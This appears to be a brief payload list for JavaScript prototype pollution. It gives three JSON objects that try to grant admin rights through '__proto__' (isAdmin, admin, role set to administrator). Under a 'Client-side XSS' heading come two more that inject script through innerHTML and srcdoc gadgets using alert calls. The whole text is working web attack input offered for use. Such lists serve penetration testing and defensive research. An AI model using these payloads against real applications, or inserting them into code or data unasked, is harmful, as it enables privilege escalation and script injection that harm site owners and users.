{"__proto__": {"isAdmin": true}}
{"__proto__": {"admin": true}}
{"__proto__": {"role": "administrator"}}

# Client-side XSS
{"__proto__": {"innerHTML": "<img src=x onerror=alert(document.domain)>"}}
{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}

